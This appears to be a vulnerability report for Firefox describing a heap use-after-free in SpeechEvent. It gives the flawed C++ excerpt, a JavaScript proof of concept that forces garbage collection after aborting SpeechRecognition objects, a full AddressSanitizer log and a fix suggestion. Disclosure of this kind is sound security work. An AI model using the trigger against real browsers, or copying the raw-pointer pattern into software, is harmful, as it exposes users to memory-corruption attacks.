## heap-use-after-free in SpeechEvent

### VULNERABILITY DETAILS

I noticed that the SpeechEvent only hold a Raw Pointer to SpeechRecognition (mRecognition) (1):
```cpp
class SpeechEvent : public Runnable {
 public:
  SpeechEvent(SpeechRecognition* aRecognition,
              SpeechRecognition::EventType aType);

  ~SpeechEvent();

  NS_IMETHOD Run() override;
  ......
  ......

 private:
  SpeechRecognition* mRecognition; // **** 1 ****
  ......
}

SpeechEvent::Run() {
  mRecognition->ProcessEvent(this); // **** 2 ****
  return NS_OK;
}

```
When a SpeechEvent dispatch to MainThread, the SpeechRecognition can be released in the JavaScript context of MainThread. And when the MainThread completes the current task and trigger SpeechEvent::Run, it will lead to a use-after-free issue in (2).

### REPRODUCTION CASE

To supporte SpeechRecognition, the media.webspeech.recognition.force_enable and media.webspeech.recognition.enable should be enable.

POC:
```javascript
<html>
<script>
// forceGC = () => {
//    // To trigger easily => fuzzing.enabled: true
//    FuzzingFunctions.garbageCollect();
//    FuzzingFunctions.cycleCollect();
// }
const MB = 0x100000;
function forceGC() {
        const maxMallocBytes = 128 * MB;
        for (var i = 0; i < 30; i++) {
            var x = new ArrayBuffer(maxMallocBytes);
        }
    }
for(i=0;i<10;i++){
    var recognition = new SpeechRecognition();
    recognition.abort(); // or stop()
    recognition = null;
    forceGC();
}

//alert();
</script>
</html>
```

## ASAN LOG

```
=================================================================
==46652==ERROR: AddressSanitizer: heap-use-after-free on address 0x6160000b6070 at pc 0x7f8aba835725 bp 0x7ffe34348f70 sp 0x7ffe34348f68
READ of size 1 at 0x6160000b6070 thread T0 (Isolated Web Co)
[46726, Unnamed thread 612000000f40] WARNING: XPCOM object Mutex constructed from static ctor/dtor: file /home/kirin/mozilla-unified/xpcom/base/nsTraceRefcnt.cpp:206
[46726, Unnamed thread 612000000f40] WARNING: XPCOM object nsDequeBase constructed from static ctor/dtor: file /home/kirin/mozilla-unified/xpcom/base/nsTraceRefcnt.cpp:206
[46726, Unnamed thread 612000000f40] WARNING: XPCOM object nsDeque constructed from static ctor/dtor: file /home/kirin/mozilla-unified/xpcom/base/nsTraceRefcnt.cpp:206
[Parent 46520, Main Thread] WARNING: 'nsContentUtils::GetCommonBrowserParentAncestor( remote, oldRemote) != remote', file /home/kirin/mozilla-unified/dom/events/EventStateManager.cpp:1451
[46728, Unnamed thread 612000000f40] WARNING: XPCOM object Mutex constructed from static ctor/dtor: file /home/kirin/mozilla-unified/xpcom/base/nsTraceRefcnt.cpp:206
[46728, Unnamed thread 612000000f40] WARNING: XPCOM object nsDequeBase constructed from static ctor/dtor: file /home/kirin/mozilla-unified/xpcom/base/nsTraceRefcnt.cpp:206
[46728, Unnamed thread 612000000f40] WARNING: XPCOM object nsDeque constructed from static ctor/dtor: file /home/kirin/mozilla-unified/xpcom/base/nsTraceRefcnt.cpp:206
    #0 0x7f8aba835724 in mozilla::dom::SpeechRecognition::ProcessEvent(mozilla::dom::SpeechEvent*) /home/kirin/mozilla-unified/dom/media/webspeech/recognition/SpeechRecognition.cpp:236:7
    #1 0x7f8aba840fb3 in mozilla::dom::SpeechEvent::Run() /home/kirin/mozilla-unified/dom/media/webspeech/recognition/SpeechRecognition.cpp:1155:17
    #2 0x7f8ab26f9bc1 in mozilla::RunnableTask::Run() /home/kirin/mozilla-unified/xpcom/threads/TaskController.cpp:467:16
    #3 0x7f8ab26b4908 in mozilla::TaskController::DoExecuteNextTaskOnlyMainThreadInternal(mozilla::detail::BaseAutoLock<mozilla::Mutex&> const&) /home/kirin/mozilla-unified/xpcom/threads/TaskController.cpp:780:26
    #4 0x7f8ab26b1d49 in mozilla::TaskController::ExecuteNextTaskOnlyMainThreadInternal(mozilla::detail::BaseAutoLock<mozilla::Mutex&> const&) /home/kirin/mozilla-unified/xpcom/threads/TaskController.cpp:612:15
    #5 0x7f8ab26b2412 in mozilla::TaskController::ProcessPendingMTTask(bool) /home/kirin/mozilla-unified/xpcom/threads/TaskController.cpp:390:36
    #6 0x7f8ab26eacea in mozilla::TaskController::InitializeInternal()::$_0::operator()() const /home/kirin/mozilla-unified/xpcom/threads/TaskController.cpp:124:37
    #7 0x7f8ab26eacea in mozilla::detail::RunnableFunction<mozilla::TaskController::InitializeInternal()::$_0>::Run() /home/kirin/mozilla-unified/objdir-ff-asan/dist/include/nsThreadUtils.h:531:5
    #8 0x7f8ab26d4738 in nsThread::ProcessNextEvent(bool, bool*) /home/kirin/mozilla-unified/xpcom/threads/nsThread.cpp:1187:16
    #9 0x7f8ab26df532 in NS_ProcessNextEvent(nsIThread*, bool) /home/kirin/mozilla-unified/xpcom/threads/nsThreadUtils.cpp:465:10
    #10 0x7f8ab3ef5bdc in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/kirin/mozilla-unified/ipc/glue/MessagePump.cpp:85:21
    #11 0x7f8ab3d3f748 in MessageLoop::RunInternal() /home/kirin/mozilla-unified/ipc/chromium/src/base/message_loop.cc:380:10
    #12 0x7f8ab3d3f4ca in MessageLoop::RunHandler() /home/kirin/mozilla-unified/ipc/chromium/src/base/message_loop.cc:373:3
    #13 0x7f8ab3d3f4ca in MessageLoop::Run() /home/kirin/mozilla-unified/ipc/chromium/src/base/message_loop.cc:355:3
    #14 0x7f8abc13d4d8 in nsBaseAppShell::Run() /home/kirin/mozilla-unified/widget/nsBaseAppShell.cpp:137:27
    #15 0x7f8ac0aa4243 in XRE_RunAppShell() /home/kirin/mozilla-unified/toolkit/xre/nsEmbedFunctions.cpp:870:20
    #16 0x7f8ab3ef6ee3 in mozilla::ipc::MessagePumpForChildProcess::Run(base::MessagePump::Delegate*) /home/kirin/mozilla-unified/ipc/glue/MessagePump.cpp:235:9
    #17 0x7f8ab3d3f748 in MessageLoop::RunInternal() /home/kirin/mozilla-unified/ipc/chromium/src/base/message_loop.cc:380:10
    #18 0x7f8ab3d3f4ca in MessageLoop::RunHandler() /home/kirin/mozilla-unified/ipc/chromium/src/base/message_loop.cc:373:3
    #19 0x7f8ab3d3f4ca in MessageLoop::Run() /home/kirin/mozilla-unified/ipc/chromium/src/base/message_loop.cc:355:3
    #20 0x7f8ac0aa3028 in XRE_InitChildProcess(int, char**, XREChildData const*) /home/kirin/mozilla-unified/toolkit/xre/nsEmbedFunctions.cpp:729:34
    #21 0x55de47a3e8b1 in content_process_main(mozilla::Bootstrap*, int, char**) /home/kirin/mozilla-unified/browser/app/../../ipc/contentproc/plugin-container.cpp:57:28
    #22 0x55de47a3f229 in main /home/kirin/mozilla-unified/browser/app/nsBrowserApp.cpp:327:18
    #23 0x7f8acf1c70b2 in __libc_start_main /build/glibc-sMfBJT/glibc-2.31/csu/../csu/libc-start.c:308:16
    #24 0x55de4798d998 in _start (/home/kirin/mozilla-unified/objdir-ff-asan/dist/bin/firefox+0xf1998)

0x6160000b6070 is located 496 bytes inside of 536-byte region [0x6160000b5e80,0x6160000b6098)
freed by thread T0 (Isolated Web Co) here:
    #0 0x55de47a09cf2 in free /builds/worker/fetches/llvm-project/compiler-rt/lib/asan/asan_malloc_linux.cpp:111:3
    #1 0x7f8ab24ca9d2 in SnowWhiteKiller::MaybeKillObject(SnowWhiteKiller::SnowWhiteObject&) /home/kirin/mozilla-unified/xpcom/base/nsCycleCollector.cpp:2419:29
    #2 0x7f8ab24bb451 in SnowWhiteKiller::~SnowWhiteKiller() /home/kirin/mozilla-unified/xpcom/base/nsCycleCollector.cpp:2406:7
    #3 0x7f8ab249d6fb in nsCycleCollector::FreeSnowWhite(bool) /home/kirin/mozilla-unified/xpcom/base/nsCycleCollector.cpp:2596:3
    #4 0x7f8ab24a4743 in nsCycleCollector::BeginCollection(mozilla::CCReason, ccIsManual, nsICycleCollectorListener*) /home/kirin/mozilla-unified/xpcom/base/nsCycleCollector.cpp:3585:3
    #5 0x7f8ab24a3d54 in nsCycleCollector::Collect(mozilla::CCReason, ccIsManual, js::SliceBudget&, nsICycleCollectorListener*, bool) /home/kirin/mozilla-unified/xpcom/base/nsCycleCollector.cpp:3412:9
    #6 0x7f8ab24a771c in nsCycleCollector_collect(mozilla::CCReason, nsICycleCollectorListener*) /home/kirin/mozilla-unified/xpcom/base/nsCycleCollector.cpp:3911:28
    #7 0x7f8ab5df3ab6 in nsJSContext::CycleCollectNow(mozilla::CCReason, nsICycleCollectorListener*) /home/kirin/mozilla-unified/dom/base/nsJSEnvironment.cpp:1385:3
    #8 0x7f8ab82d8a85 in mozilla::dom::FuzzingFunctions_Binding::cycleCollect(JSContext*, unsigned int, JS::Value*) /home/kirin/mozilla-unified/objdir-ff-asan/dom/bindings/FuzzingFunctionsBinding.cpp:132:3
    #9 0x7f8ac0fb5e04 in CallJSNative(JSContext*, bool (*)(JSContext*, unsigned int, JS::Value*), js::CallReason, JS::CallArgs const&) /home/kirin/mozilla-unified/js/src/vm/Interpreter.cpp:420:13
    #10 0x7f8ac0f90663 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct, js::CallReason) /home/kirin/mozilla-unified/js/src/vm/Interpreter.cpp:507:12
    #11 0x7f8ac0f92f2e in InternalCall(JSContext*, js::AnyInvokeArgs const&, js::CallReason) /home/kirin/mozilla-unified/js/src/vm/Interpreter.cpp:567:10
    #12 0x7f8ac0f6c604 in js::CallFromStack(JSContext*, JS::CallArgs const&) /home/kirin/mozilla-unified/js/src/vm/Interpreter.cpp:571:10
    #13 0x7f8ac0f6c604 in Interpret(JSContext*, js::RunState&) /home/kirin/mozilla-unified/js/src/vm/Interpreter.cpp:3293:16
    #14 0x7f8ac0f4c153 in js::RunScript(JSContext*, js::RunState&) /home/kirin/mozilla-unified/js/src/vm/Interpreter.cpp:389:13
    #15 0x7f8ac0f9732b in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JS::Handle<JSObject*>, js::AbstractFramePtr, JS::MutableHandle<JS::Value>) /home/kirin/mozilla-unified/js/src/vm/Interpreter.cpp:760:13
    #16 0x7f8ac0f97efc in js::Execute(JSContext*, JS::Handle<JSScript*>, JS::Handle<JSObject*>, JS::MutableHandle<JS::Value>) /home/kirin/mozilla-unified/js/src/vm/Interpreter.cpp:792:10
    #17 0x7f8ac121e0e2 in ExecuteScript(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSScript*>, JS::MutableHandle<JS::Value>) /home/kirin/mozilla-unified/js/src/vm/CompilationAndEvaluation.cpp:515:10
    #18 0x7f8ac121e731 in JS_ExecuteScript(JSContext*, JS::Handle<JSScript*>) /home/kirin/mozilla-unified/js/src/vm/CompilationAndEvaluation.cpp:539:10
    #19 0x7f8ab5b11963 in mozilla::dom::JSExecutionContext::ExecScript() /home/kirin/mozilla-unified/dom/base/JSExecutionContext.cpp:296:8
    #20 0x7f8abbb6890e in mozilla::dom::ExecuteCompiledScript(JSContext*, mozilla::dom::JSExecutionContext&, JS::loader::ClassicScript*) /home/kirin/mozilla-unified/dom/script/ScriptLoader.cpp:2019:16
    #21 0x7f8abbb6890e in mozilla::dom::ScriptLoader::EvaluateScript(nsIGlobalObject*, JS::loader::ScriptLoadRequest*) /home/kirin/mozilla-unified/dom/script/ScriptLoader.cpp:2275:12
    #22 0x7f8abbb6715f in mozilla::dom::ScriptLoader::EvaluateScriptElement(JS::loader::ScriptLoadRequest*) /home/kirin/mozilla-unified/dom/script/ScriptLoader.cpp:2081:10
    #23 0x7f8abbb5fae7 in mozilla::dom::ScriptLoader::ProcessRequest(JS::loader::ScriptLoadRequest*) /home/kirin/mozilla-unified/dom/script/ScriptLoader.cpp:1738:10
    #24 0x7f8abbb5c603 in mozilla::dom::ScriptLoader::ProcessInlineScript(nsIScriptElement*, JS::loader::ScriptKind) /home/kirin/mozilla-unified/dom/script/ScriptLoader.cpp:1163:10
    #25 0x7f8abbb4c9ab in mozilla::dom::ScriptLoader::ProcessScriptElement(nsIScriptElement*) /home/kirin/mozilla-unified/dom/script/ScriptLoader.cpp:867:10
    #26 0x7f8abbb4ba48 in mozilla::dom::ScriptElement::MaybeProcessScript() /home/kirin/mozilla-unified/dom/script/ScriptElement.cpp:118:18
    #27 0x7f8ab474637d in nsIScriptElement::AttemptToExecute() /home/kirin/mozilla-unified/objdir-ff-asan/dist/include/nsIScriptElement.h:211:18
    #28 0x7f8ab474637d in nsHtml5TreeOpExecutor::RunScript(nsIContent*) /home/kirin/mozilla-unified/parser/html/nsHtml5TreeOpExecutor.cpp:933:22
    #29 0x7f8ab4741d78 in nsHtml5TreeOpExecutor::RunFlushLoop() /home/kirin/mozilla-unified/parser/html/nsHtml5TreeOpExecutor.cpp:726:7
    #30 0x7f8ab477c035 in nsHtml5ExecutorFlusher::Run() /home/kirin/mozilla-unified/parser/html/nsHtml5StreamParser.cpp:173:18
    #31 0x7f8ab26945a0 in mozilla::SchedulerGroup::Runnable::Run() /home/kirin/mozilla-unified/xpcom/threads/SchedulerGroup.cpp:140:20
    #32 0x7f8ab26f9bc1 in mozilla::RunnableTask::Run() /home/kirin/mozilla-unified/xpcom/threads/TaskController.cpp:467:16

previously allocated by thread T0 (Isolated Web Co) here:
    #0 0x55de47a09f5d in malloc /builds/worker/fetches/llvm-project/compiler-rt/lib/asan/asan_malloc_linux.cpp:129:3
    #1 0x55de47a46e6d in moz_xmalloc /home/kirin/mozilla-unified/memory/mozalloc/mozalloc.cpp:52:15
    #2 0x7f8aba8354da in operator new(unsigned long) /home/kirin/mozilla-unified/objdir-ff-asan/dist/include/mozilla/cxxalloc.h:33:10
    #3 0x7f8aba8354da in mozilla::dom::SpeechRecognition::Constructor(mozilla::dom::GlobalObject const&, mozilla::ErrorResult&) /home/kirin/mozilla-unified/dom/media/webspeech/recognition/SpeechRecognition.cpp:228:38
    #4 0x7f8ab72d6b3d in mozilla::dom::SpeechRecognition_Binding::_constructor(JSContext*, unsigned int, JS::Value*) /home/kirin/mozilla-unified/objdir-ff-asan/dom/bindings/SpeechRecognitionBinding.cpp:1764:63
    #5 0x7f8ac0fb5e04 in CallJSNative(JSContext*, bool (*)(JSContext*, unsigned int, JS::Value*), js::CallReason, JS::CallArgs const&) /home/kirin/mozilla-unified/js/src/vm/Interpreter.cpp:420:13
    #6 0x7f8ac0fbf698 in CallJSNativeConstructor(JSContext*, bool (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) /home/kirin/mozilla-unified/js/src/vm/Interpreter.cpp:436:8
    #7 0x7f8ac0f940df in InternalConstruct(JSContext*, js::AnyConstructArgs const&) /home/kirin/mozilla-unified/js/src/vm/Interpreter.cpp:631:10
    #8 0x7f8ac0f6c560 in js::ConstructFromStack(JSContext*, JS::CallArgs const&) /home/kirin/mozilla-unified/js/src/vm/Interpreter.cpp:658:10
    #9 0x7f8ac0f6c560 in Interpret(JSContext*, js::RunState&) /home/kirin/mozilla-unified/js/src/vm/Interpreter.cpp:3283:16
    #10 0x7f8ac0f4c153 in js::RunScript(JSContext*, js::RunState&) /home/kirin/mozilla-unified/js/src/vm/Interpreter.cpp:389:13
    #11 0x7f8ac0f9732b in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JS::Handle<JSObject*>, js::AbstractFramePtr, JS::MutableHandle<JS::Value>) /home/kirin/mozilla-unified/js/src/vm/Interpreter.cpp:760:13
    #12 0x7f8ac0f97efc in js::Execute(JSContext*, JS::Handle<JSScript*>, JS::Handle<JSObject*>, JS::MutableHandle<JS::Value>) /home/kirin/mozilla-unified/js/src/vm/Interpreter.cpp:792:10
    #13 0x7f8ac121e0e2 in ExecuteScript(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSScript*>, JS::MutableHandle<JS::Value>) /home/kirin/mozilla-unified/js/src/vm/CompilationAndEvaluation.cpp:515:10
    #14 0x7f8ac121e731 in JS_ExecuteScript(JSContext*, JS::Handle<JSScript*>) /home/kirin/mozilla-unified/js/src/vm/CompilationAndEvaluation.cpp:539:10
    #15 0x7f8ab5b11963 in mozilla::dom::JSExecutionContext::ExecScript() /home/kirin/mozilla-unified/dom/base/JSExecutionContext.cpp:296:8
    #16 0x7f8abbb6890e in mozilla::dom::ExecuteCompiledScript(JSContext*, mozilla::dom::JSExecutionContext&, JS::loader::ClassicScript*) /home/kirin/mozilla-unified/dom/script/ScriptLoader.cpp:2019:16
    #17 0x7f8abbb6890e in mozilla::dom::ScriptLoader::EvaluateScript(nsIGlobalObject*, JS::loader::ScriptLoadRequest*) /home/kirin/mozilla-unified/dom/script/ScriptLoader.cpp:2275:12
    #18 0x7f8abbb6715f in mozilla::dom::ScriptLoader::EvaluateScriptElement(JS::loader::ScriptLoadRequest*) /home/kirin/mozilla-unified/dom/script/ScriptLoader.cpp:2081:10
    #19 0x7f8abbb5fae7 in mozilla::dom::ScriptLoader::ProcessRequest(JS::loader::ScriptLoadRequest*) /home/kirin/mozilla-unified/dom/script/ScriptLoader.cpp:1738:10
    #20 0x7f8abbb5c603 in mozilla::dom::ScriptLoader::ProcessInlineScript(nsIScriptElement*, JS::loader::ScriptKind) /home/kirin/mozilla-unified/dom/script/ScriptLoader.cpp:1163:10
    #21 0x7f8abbb4c9ab in mozilla::dom::ScriptLoader::ProcessScriptElement(nsIScriptElement*) /home/kirin/mozilla-unified/dom/script/ScriptLoader.cpp:867:10
    #22 0x7f8abbb4ba48 in mozilla::dom::ScriptElement::MaybeProcessScript() /home/kirin/mozilla-unified/dom/script/ScriptElement.cpp:118:18
    #23 0x7f8ab474637d in nsIScriptElement::AttemptToExecute() /home/kirin/mozilla-unified/objdir-ff-asan/dist/include/nsIScriptElement.h:211:18
    #24 0x7f8ab474637d in nsHtml5TreeOpExecutor::RunScript(nsIContent*) /home/kirin/mozilla-unified/parser/html/nsHtml5TreeOpExecutor.cpp:933:22
    #25 0x7f8ab4741d78 in nsHtml5TreeOpExecutor::RunFlushLoop() /home/kirin/mozilla-unified/parser/html/nsHtml5TreeOpExecutor.cpp:726:7
    #26 0x7f8ab477c035 in nsHtml5ExecutorFlusher::Run() /home/kirin/mozilla-unified/parser/html/nsHtml5StreamParser.cpp:173:18
    #27 0x7f8ab26945a0 in mozilla::SchedulerGroup::Runnable::Run() /home/kirin/mozilla-unified/xpcom/threads/SchedulerGroup.cpp:140:20
    #28 0x7f8ab26f9bc1 in mozilla::RunnableTask::Run() /home/kirin/mozilla-unified/xpcom/threads/TaskController.cpp:467:16
    #29 0x7f8ab26b4908 in mozilla::TaskController::DoExecuteNextTaskOnlyMainThreadInternal(mozilla::detail::BaseAutoLock<mozilla::Mutex&> const&) /home/kirin/mozilla-unified/xpcom/threads/TaskController.cpp:780:26
    #30 0x7f8ab26b1d49 in mozilla::TaskController::ExecuteNextTaskOnlyMainThreadInternal(mozilla::detail::BaseAutoLock<mozilla::Mutex&> const&) /home/kirin/mozilla-unified/xpcom/threads/TaskController.cpp:612:15
    #31 0x7f8ab26b2412 in mozilla::TaskController::ProcessPendingMTTask(bool) /home/kirin/mozilla-unified/xpcom/threads/TaskController.cpp:390:36
    #32 0x7f8ab26eacea in mozilla::TaskController::InitializeInternal()::$_0::operator()() const /home/kirin/mozilla-unified/xpcom/threads/TaskController.cpp:124:37
    #33 0x7f8ab26eacea in mozilla::detail::RunnableFunction<mozilla::TaskController::InitializeInternal()::$_0>::Run() /home/kirin/mozilla-unified/objdir-ff-asan/dist/include/nsThreadUtils.h:531:5
    #34 0x7f8ab26d4738 in nsThread::ProcessNextEvent(bool, bool*) /home/kirin/mozilla-unified/xpcom/threads/nsThread.cpp:1187:16

SUMMARY: AddressSanitizer: heap-use-after-free /home/kirin/mozilla-unified/dom/media/webspeech/recognition/SpeechRecognition.cpp:236:7 in mozilla::dom::SpeechRecognition::ProcessEvent(mozilla::dom::SpeechEvent*)
Shadow bytes around the buggy address:
  0x0c2c8000ebb0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c2c8000ebc0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c2c8000ebd0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c2c8000ebe0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c2c8000ebf0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
=>0x0c2c8000ec00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd[fd]fd
  0x0c2c8000ec10: fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c2c8000ec20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c2c8000ec30: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c2c8000ec40: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c2c8000ec50: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==46652==ABORTING
```

### Suggestion

Hold a reference of SpeechRecognition in SpeechEvent to prevent it from being released before SpeechEvent::Run.
